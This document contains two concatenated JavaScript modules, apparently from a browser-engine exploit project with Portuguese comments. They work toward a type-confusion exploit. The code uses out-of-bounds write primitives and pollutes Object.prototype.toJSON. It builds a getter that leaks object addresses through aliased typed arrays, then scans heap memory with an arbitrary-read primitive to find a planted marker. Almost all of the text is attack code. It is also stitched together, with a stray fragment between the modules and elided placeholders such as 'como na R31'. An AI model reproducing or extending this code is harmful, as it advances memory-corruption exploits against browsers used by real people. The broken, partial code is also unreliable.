// js/script3/// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R40)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs'; 
import {
    triggerOOB_primitive, 
    clearOOBEnvironment,
    arb_read, 
    oob_write_absolute, 
    oob_read_absolute,
    isOOBReady,
    oob_array_buffer_real 
} from '../core_exploit.mjs'; 

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL = "OriginalHeisenbug_TypedArrayAddrof_v82_AdvancedGetterLeak";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; 
const OOB_WRITE_VALUES_V82 = [0xFFFFFFFF]; 

const FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD = 0.82828282828282;
const PROBE_CALL_LIMIT_V82 = 10; 

const SCAN_MARKER_VALUE_R40 = new AdvancedInt64(0x41424344, 0x45464748); 
const SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R40 = 0x100; 
const SCAN_HEAP_START_ADDRESS_R40 = new AdvancedInt64(0x0, 0x8A000000); 
const SCAN_HEAP_END_ADDRESS_R40 = new AdvancedInt64(0x0, 0x8A020000); 
const SCAN_STEP_R40 = 0x1000; 

function advInt64LessThanOrEqual(a, b) { /* ... (como na R31) ... */
    if (!a || !b || typeof a.high !== 'function' || typeof a.low !== 'function' || typeof b.high !== 'function' || typeof b.low !== 'function') { return false; }
    if (a.high() < b.high()) return true; if (a.high() > b.high()) return false; return a.low() <= b.low(); 
}

export async function executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40() { 
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug TC + Memory Scan (R40) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL} Init R40...`;

    let iteration_results_summary = [];
    let best_result_for_runner = { /* ... (como na R31) ... */
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        memory_scan_result: { success: false, msg: "Memory scan (R40): Not run.", found_at_address: null, oob_buffer_base_addr: null },
        oob_value_used: null, heisenbug_on_M2_confirmed_by_tc_probe: false
    };
    let final_probe_call_count_for_report = 0;

    for (const current_oob_value of OOB_WRITE_VALUES_V82) {
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_OOB${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION R40: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        let probe_call_count_iter = 0; let victim_typed_array_ref_iter = null;
        let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; 
        let iteration_tc_first_detection_done = false; 

        const current_object_to_leak_A = { marker_A_R40: `LeakA_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        const current_object_to_leak_B = { marker_B_R40: `LeakB_OOB_Val${toHex(current_oob_value)}`,r:Math.random() };
        
        function toJSON_TA_Probe_Iter_Closure_R40() { /* ... (lógica da sonda como na R31, apenas atualizando logs para R40) ... */ 
            probe_call_count_iter++; const call_num=probe_call_count_iter; const ctts=Object.prototype.toString.call(this);
            const is_m2c=(this===marker_M2_ref_iter&&marker_M2_ref_iter!==null&&ctts==='[object Object]');
            logS3(`[PROBE_R40] Call #${call_num}.'this':${ctts}.IsM2C?${is_m2c}.TCFlag:${iteration_tc_first_detection_done}`,"leak");
            try{if(call_num>PROBE_CALL_LIMIT_V82)return{r_stop:"limit"};if(call_num===1&&this===victim_typed_array_ref_iter){marker_M2_ref_iter={marker_id_v82:"M2_Iter_R40"};marker_M1_ref_iter={marker_id_v82:"M1_Iter_R40",payload_M2:marker_M2_ref_iter};return marker_M1_ref_iter;}else if(is_m2c){if(!iteration_tc_first_detection_done){iteration_tc_first_detection_done=true;iteration_final_tc_details_from_probe={call_number_tc_detected:call_num,probe_variant:"TA_Probe_R40",this_type:"[object Object]",this_is_M2:true,getter_defined:false,direct_prop_set:false,getter_fired:false,leak_val_getter_int64:null,leak_val_getter_is_ptr:false,error_probe:null};logS3(`[PROBE_R40] Call #${call_num} (M2C): FIRST TC. Details obj CREATED. ID:${this.marker_id_v82}`,"vuln");}
            if(iteration_final_tc_details_from_probe&&(!this.hasOwnProperty('leaky_A_getter_v82')||iteration_final_tc_details_from_probe.call_number_tc_detected===call_num)){try{Object.defineProperty(this,'leaky_A_getter_v82',{get:function(){const det=iteration_final_tc_details_from_probe;if(det)det.getter_fired=true;if(!victim_typed_array_ref_iter?.buffer){if(det)det.leak_val_getter_int64="getter_victim_null";return"getter_victim_null";}
            let lvf=NaN,lis="getter_err_r40";try{let vfv=new Float64Array(victim_typed_array_ref_iter.buffer);let vu32=new Uint32Array(victim_typed_array_ref_iter.buffer);const o0=vu32[0],o1=vu32[1];vfv[0]=current_object_to_leak_A;lvf=vfv[0];const llo=vu32[0],lhi=vu32[1];lis=new AdvancedInt64(llo,lhi).toString(true);vu32[0]=o0;vu32[1]=o1;if(det)det.leak_val_getter_int64=lis;logS3(`[PROBE_R40] Getter: Leaked Int64: ${lis}`,"leak");const nan=(lhi>=0x7FF00000&&lhi<0x80000000)||(lhi>=0xFFF00000&&lhi<0x100000000);if(!nan&&lhi!==0){if((lhi>=0xFFFF0000)||(lhi>0&&lhi<0xF0000)||(lhi>=0x100000&&lhi<0x7F000000)){if(det)det.leak_val_getter_is_ptr=true;return lvf;}}
            return nan?"getter_val_nan_inf":"getter_val_other";}catch(e_g){lis=`getter_ex:${e_g.message}`;if(det)det.leak_val_getter_int64=lis;return lis;}},enumerable:true,configurable:true});if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.getter_defined=true;this.leaky_B_direct_v82=current_object_to_leak_B;if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.direct_prop_set=true;}catch(e_m2d){if(iteration_final_tc_details_from_probe)iteration_final_tc_details_from_probe.error_probe=`M2DefErr:${e_m2d.message}`;}}return this;}}catch(e_pm){return{err_pm:call_num,msg:e_pm.message};}return{gen_m:call_num,type:ctts};
        }

        // ... (Resto da função execute... como na R31, apenas atualizando nomes de log e o nome da função da sonda)
        // A lógica do loop de scan de memória (Fase 2) usa await PAUSE_S3(0); corretamente.
        // O preenchimento de best_result_for_runner e current_iter_summary é mantido.
        let iter_raw_stringify_output = null; let iter_stringify_output_parsed = null;
        let iter_primary_error = null; 
        let iter_memory_scan_result = { success: false, msg: "Memory scan (R40): Not run.", found_at_address: null, oob_buffer_base_addr: null };
        let heisenbugConfirmedThisIter = false; 
        
        try { 
            logS3(`  --- Fase 1 (R40): Detecção de Type Confusion ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-TCSetup` });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, current_oob_value, 4);
            await PAUSE_S3(150); victim_typed_array_ref_iter = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            new Float64Array(victim_typed_array_ref_iter.buffer).fill(FILL_PATTERN_V82_FOR_GETTER_SCRATCHPAD);
            const ppKey='toJSON'; let origDesc=Object.getOwnPropertyDescriptor(Object.prototype,ppKey); let polluted=false;
            try {
                Object.defineProperty(Object.prototype,ppKey,{value:toJSON_TA_Probe_Iter_Closure_R40,writable:true,configurable:true,enumerable:false}); polluted=true;
                iter_raw_stringify_output = JSON.stringify(victim_typed_array_ref_iter); 
                logS3(`  TC Probe R40: JSON.stringify Raw: ${iter_raw_stringify_output ? iter_raw_stringify_output.substring(0,200) + "..." : "N/A"}`, "info");
                try{iter_stringify_output_parsed=JSON.parse(iter_raw_stringify_output);}catch(e_p){iter_stringify_output_parsed={err_parse:iter_raw_stringify_output};}
                if(iteration_final_tc_details_from_probe && iteration_final_tc_details_from_probe.this_is_M2){
                    heisenbugConfirmedThisIter=true; logS3(`  TC Probe R40: TC on M2 CONFIRMED. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "vuln");
                    if(iteration_final_tc_details_from_probe.error_probe && !iter_primary_error) iter_primary_error=new Error(iteration_final_tc_details_from_probe.error_probe);
                }else{logS3(` TC Probe R40: TC on M2 NOT Confirmed. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "error");}
            }catch(e_str){if(!iter_primary_error)iter_primary_error=e_str;}finally{if(polluted){if(origDesc)Object.defineProperty(Object.prototype,ppKey,origDesc);else delete Object.prototype[ppKey];}}
            logS3(`  --- Fase 1 (R40) Concluída. TC M2 (Sonda): ${heisenbugConfirmedThisIter} ---`, "subtest");
            await PAUSE_S3(100);
            logS3(`  --- Fase 2 (R40): Teste de Memory Scan ---`, "subtest", FNAME_CURRENT_ITERATION);
            if (heisenbugConfirmedThisIter) { 
                try {
                    await triggerOOB_primitive({ force_reinit: false, caller_fname: `${FNAME_CURRENT_ITERATION}-MemScanSetup` }); 
                    if (!isOOBReady(`${FNAME_CURRENT_ITERATION}-MemScanSetup`)) {
                        throw new Error("Ambiente OOB não pronto para Memory Scan.");
                    }
                    logS3(`  MemScan: Plantando marcador ${SCAN_MARKER_VALUE_R40.toString(true)} em oob_array_buffer_real[${toHex(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R40)}]...`, 'info');
                    oob_write_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R40, SCAN_MARKER_VALUE_R40, 8);
                    const verify_marker = oob_read_absolute(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R40, 8);
                    if (!verify_marker.equals(SCAN_MARKER_VALUE_R40)) {
                        throw new Error(`Falha ao plantar/verificar marcador. Lido: ${verify_marker.toString(true)}`);
                    }
                    logS3(`  MemScan: Marcador plantado e verificado. Iniciando varredura...`, 'good');
                    let found_marker_addr = null;
                    for (let current_scan_addr = new AdvancedInt64(SCAN_HEAP_START_ADDRESS_R40.low(), SCAN_HEAP_START_ADDRESS_R40.high()); 
                         advInt64LessThanOrEqual(current_scan_addr, SCAN_HEAP_END_ADDRESS_R40); 
                         current_scan_addr = current_scan_addr.add(SCAN_STEP_R40)) {
                        if (current_scan_addr.low() % (SCAN_STEP_R40 * 20) === 0) {logS3(`  MemScan: Escaneando em ${current_scan_addr.toString(true)}...`, 'debug');}
                        try { 
                            const value_at_addr = await arb_read(current_scan_addr, 8); 
                            if (isAdvancedInt64Object(value_at_addr) && value_at_addr.equals(SCAN_MARKER_VALUE_R40)) {
                                found_marker_addr = new AdvancedInt64(current_scan_addr.low(), current_scan_addr.high());
                                iter_memory_scan_result.found_at_address = found_marker_addr.toString(true);
                                iter_memory_scan_result.oob_buffer_base_addr = found_marker_addr.sub(SCAN_MARKER_OFFSET_IN_OOB_BUFFER_R40).toString(true);
                                iter_memory_scan_result.success = true;
                                iter_memory_scan_result.msg = `Marcador encontrado em ${found_marker_addr.toString(true)}! Base OOB estimada: ${iter_memory_scan_result.oob_buffer_base_addr}`;
                                logS3(`  MemScan: SUCESSO! ${iter_memory_scan_result.msg}`, "vuln"); break; 
                            }
                        } catch (e_scan_read) { 
                            if (current_scan_addr.low() % (SCAN_STEP_R40 * 50) === 0) { 
                                logS3(`  MemScan: Erro ao ler/processar ${current_scan_addr.toString(true)}: ${e_scan_read.name} - ${e_scan_read.message}`, 'warn');
                            }
                        }
                        await PAUSE_S3(0); 
                    }
                    if (!found_marker_addr) iter_memory_scan_result.msg = `MemScan: Marcador não encontrado na faixa ${SCAN_HEAP_START_ADDRESS_R40.toString(true)} - ${SCAN_HEAP_END_ADDRESS_R40.toString(true)}.`;
                } catch (e_mem_scan) {
                    iter_memory_scan_result.msg = `MemScan EXCEPTION: ${e_mem_scan.message || String(e_mem_scan)}`;
                    if (!iter_primary_error) iter_primary_error = e_mem_scan;
                }
            } else { iter_memory_scan_result.msg = "Memory scan: Pulado (TC Fase 1 falhou)."; }
            logS3(`  --- Fase 2 (R40) Concluída. Memory Scan Sucesso: ${iter_memory_scan_result.success} ---`, "subtest");

        }catch(e_outer){if(!iter_primary_error)iter_primary_error=e_outer; logS3(`  CRITICAL ERROR ITERATION R40: ${e_outer.message || String(e_outer)}`, "critical");}
        finally{clearOOBEnvironment({caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClearR40`});}

        final_probe_call_count_for_report = probe_call_count_iter;
        
        let current_iter_summary = { /* ... */ }; 
        iteration_results_summary.push(current_iter_summary);
        // Lógica de best_result_for_runner
        // ... (como na R31)
        
        if(iter_memory_scan_result.success)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: Scan OK!`;
        else if(heisenbugConfirmedThisIter)document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: TC OK`;
        else document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: Iter Done`;
        await PAUSE_S3(250);
    } 
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Best/Final result (R40): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    return { /* ... (como na R31) ... */ }; 
} (ATUALIZADO para Revisado 40)
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import {
    executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40, // <<<< NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R40"; 
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) ====`, 'test', FNAME_RUNNER);
    const result = await executeTypedArrayVictimAddrofTest_AdvancedGetterLeak_R40(); 
    // ... (lógica de processamento de resultado como na R31, adaptando logs para R40) ...
    if(result.errorOccurred){logS3(` RUNNER R40: ERRO: ${String(result.errorOccurred)}.`,"critical",FNAME_RUNNER);document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: ERR!`;}
    else if(result){/* ... logs como R31 ... */} else{document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40: Invalid Res`;}
    logS3(`  Título da página final: ${document.title}`, "info", FNAME_RUNNER);
    await PAUSE_S3(MEDIUM_PAUSE_S3);
    logS3(`==== Estratégia de Reprodução do Heisenbug (${FNAME_RUNNER}) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_MainOrchestrator_R40`; 
    logS3(`==== INICIANDO Script 3 R40 (${FNAME_ORCHESTRATOR}) ... ====`, 'test', FNAME_ORCHESTRATOR);
    await runHeisenbugReproStrategy_TypedArrayVictim();
    logS3(`\n==== Script 3 R40 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    const runBtn = getRunBtnAdvancedS3(); if(runBtn) runBtn.disabled = false;
    if (document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL)&&!document.title.includes("SUCCESS")&&!document.title.includes("Fail")&&!document.title.includes("OK")&&!document.title.includes("Confirmed")){document.title=`${FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL}_R40 Done`;}
}